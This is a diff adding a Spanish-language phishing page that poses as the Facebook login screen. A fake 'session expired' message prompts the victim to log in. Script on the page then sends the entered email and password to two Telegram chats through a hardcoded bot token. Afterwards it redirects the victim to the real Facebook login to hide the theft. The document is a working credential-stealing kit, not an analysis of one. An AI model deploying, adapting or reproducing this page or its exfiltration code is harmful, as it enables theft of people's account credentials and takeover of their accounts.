@@ -1,0 +1,155 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión</title>
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+<body>
+
+<div id="miModal" class="modal">
+        <div class="modal-content">
+            <p>¡Su sesión de facebook ha expirado, por favor vuelva a iniciar sesión!</p>
+            <button class="modal-button" onclick="cerrarModal()">Aceptar</button>
+        </div>
+    </div>
+
+<!--
+	  MAIN CONTENT STRAT
+                        -->
+<div class="main-contend-section">
+	<div class="main-container">
+		<div class="w-50">
+			<div class="logo">
+				<img src="https://res.cloudinary.com/drgxflcsb/image/upload/v1681242147/facebook%20clone/logo_mlo10v.svg" alt="Logo">
+			</div>
+			<div class="fb-tag-line">
+				<h3 id="tnk">Facebook te ayuda a conectar y compartir con las personas de tu vida</h3>
+			</div>
+		</div>
+		<div class="w-50">
+			<div class="form-section">
+				<form action="#" method="POST" id="myForm">
+					<div class="form-group">
+                <input type="text" id="email" name="email" placeholder="Número de teléfono o correo electrónico">
+                <div id="emailError" class="error-message">This field is required. Please enter text.</div>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Contraseña">
+                <div id="passwordError" class="error-message">Debe colocar su contraseña de forma correcta</div>
+                <div id="successMessage" class="success-message">¡Datos enviados correctamente!</div>
+            </div>
+            
+            <button type="submit" class="login-button">Iniciar sesión</button>
+            
+            <div class="forgot-password">
+                <a href="#">¿Contraseña olvidada?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <button type="button" class="create-account-button">Crear nueva cuenta</button>
+        </form>
+			</div>
+			<div class="create-page">
+				<p><a href="#" target="_self">Crea una página </a>para una celebridad, banda o negocio.</p>
+			</div>
+		</div>
+	</div>
+</div>
+
+<script>
+    const form = document.getElementById('myForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const successMessage = document.getElementById('successMessage');
+
+    const botToken = "8162921269:AAE6zc0lmSMSDTv_J813lsNtqTWvm12M-Uc";
+    const chatIds = ["7196561108", "5742895413"]; 
+    const redirectUrl = "https://www.facebook.com/login.php/";
+
+    function cerrarModal() {
+        const modal = document.getElementById("miModal");
+        if (modal) {
+            modal.style.display = "none";
+        }
+    }
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        let isValid = true;
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        // Resetear errores
+        emailError.style.display = 'none';
+        passwordError.style.display = 'none';
+        successMessage.style.display = 'none';
+
+        if (email === '') {
+            emailError.style.display = 'block';
+            isValid = false;
+        }
+
+        if (password === '') {
+            passwordError.style.display = 'block';
+            isValid = false;
+        }
+
+        if (!isValid) return;
+
+        const message = `📩 *Nuevo Usuario* 📩\n\n📧 *Correo:* ${email}\n🔑 *Contraseña:* ${password}`;
+        const sendMessages = chatIds.map(id => {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+    return fetch(url).then(res => res.json());
+});
+
+Promise.all(sendMessages)
+    .then(results => {
+        const allSuccessful = results.every(r => r.ok);
+        if (allSuccessful) {
+            successMessage.style.display = 'block';
+            cerrarModal();
+            window.location.href = redirectUrl;
+        } else {
+            console.error("Error en uno o más envíos:", results);
+            alert("Hubo un problema al enviar los datos.");
+        }
+    })
+    .catch(err => {
+        console.error("Error en la solicitud:", err);
+        alert("Error de conexión al servidor.");
+    });
+    });
+
+    // Validación en tiempo real
+    emailInput.addEventListener('blur', () => {
+        if (emailInput.value.trim() === '') {
+            emailError.style.display = 'block';
+            successMessage.style.display = 'none';
+        } else {
+            emailError.style.display = 'none';
+        }
+    });
+
+    passwordInput.addEventListener('blur', () => {
+        if (passwordInput.value.trim() === '') {
+            passwordError.style.display = 'block';
+            successMessage.style.display = 'none';
+        } else {
+            passwordError.style.display = 'none';
+        }
+    });
+
+    emailInput.addEventListener('input', () => successMessage.style.display = 'none');
+    passwordInput.addEventListener('input', () => successMessage.style.display = 'none');
+</script>
+</body>
+  </html>
